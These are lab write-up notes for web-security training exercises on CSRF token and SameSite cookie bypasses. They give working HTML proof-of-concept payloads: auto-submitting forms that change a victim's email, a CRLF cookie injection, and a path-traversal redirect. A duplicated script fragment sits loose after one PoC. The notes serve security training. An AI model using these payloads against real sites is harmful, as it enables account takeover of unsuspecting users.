## Lab: CSRF where token validation depends on request method

### Exploitation

Change the method from `POST` to `GET`:

```html
<html>
  <body>
    <form action="https://0ac200af04aaef95804103d2009a006d.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="exploit&#64;normal&#45;user&#46;net" />

    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Lab: CSRF where token is tied to non-session cookie

### Analysis

The `csrfKey` cookie and `csrf` parameter are validated against each other, but not tied to the authenticated user session.

### Exploitation

Inject the cookie via CRLF injection in the search parameter:

```text
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

Image injection element:

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

Full Exploit PoC:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/');</script>
    <form action="https://0aa4003004fd692b818f9d620042001e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="tessdadt&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="pL7F2dYtq95W4HhGinZQ0m1cdnEmldhe" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0aa4003004fd692b818f9d620042001e.web-security-academy.net/?search=test%0D%0ASet%2DCookie:%20csrfKey=K410U3EwwGf6hhKcDJzVfIObAZIQ441D;%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

## Lab: SameSite Strict bypass via client-side redirect

### Analysis

The code uses `document.location` to **redirect the victim's browser** to a crafted URL on the same origin.

### Exploitation

```html
<html>
  <body>
    <script>
      document.location = "https://0a5a00c2040180718071128600d000bb.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
    </script>
  </body>
</html>
```

## Lab: SameSite Strict bypass via sibling domain

### Exploitation

Add a meta tag to drop the referrer header:

```html
<meta name="referrer" content="no-referrer">
```
